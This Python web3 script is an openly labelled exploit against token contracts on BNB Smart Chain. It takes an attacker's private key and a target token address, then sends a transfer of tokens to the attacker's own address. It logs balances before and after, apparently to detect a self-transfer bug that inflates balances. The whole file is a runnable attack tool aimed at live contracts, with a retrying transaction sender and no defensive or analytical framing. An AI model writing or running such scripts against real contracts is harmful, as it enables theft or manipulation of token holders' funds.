from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Exploit _transfer by sending to self")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)
contract_address = w3.toChecksumAddress(args.token_address)
attacker_address = account.address

# ===== TOKEN ABI =====
TOKEN_ABI = [
    {"inputs": [{"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"},
]

# ===== CORE FUNCTION =====
def send_transaction(contract_function, value=0, gas=300000, retries=3, delay=5):
    """Robust transaction sending with retries and gas management"""
    for attempt in range(retries):
        try:
            tx = contract_function.build_transaction({
                "from": attacker_address,
                "nonce": w3.eth.get_transaction_count(attacker_address),
                "gas": gas,
                "gasPrice": int(w3.eth.gas_price * 1.2),
                "value": value
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            return w3.eth.wait_for_transaction_receipt(tx_hash)
        except exceptions.TransactionNotFound:
            if attempt == retries - 1:
                raise
            time.sleep(delay)
        except ValueError as e:
            if "replacement transaction underpriced" in str(e) and attempt < retries - 1:
                time.sleep(delay)
                continue
            raise

def execute_exploit():
    """Main exploit execution flow"""
    token = w3.eth.contract(address=contract_address, abi=TOKEN_ABI)

    print(f"[+] Target Contract: {contract_address}")
    print(f"[+] Attacker Address: {attacker_address}")

    amount = 1  # Try transferring a small amount

    print("[+] Attempting transfer to self...")
    try:
        initial_balance = token.functions.balanceOf(attacker_address).call()
        print(f"[+] Initial Balance: {initial_balance}")

        tx_receipt = send_transaction(
            token.functions.transfer(
                attacker_address,
                amount
            ),
            gas=400000
        )

        print("\n[+] Transfer Results:")
        print(f"TX Hash: {tx_receipt.transactionHash.hex()}")
        print(f"Status: {'Success' if tx_receipt.status == 1 else 'Failed'}")
        print(f"Gas Used: {tx_receipt.gasUsed}")

        final_balance = token.functions.balanceOf(attacker_address).call()
        print(f"[+] Final Balance: {final_balance}")

    except Exception as e:
        print(f"\n[!] Transfer failed: {e}")
        print("Reason: Likely the _transfer function reverted.")

if __name__ == "__main__":
    execute_exploit()
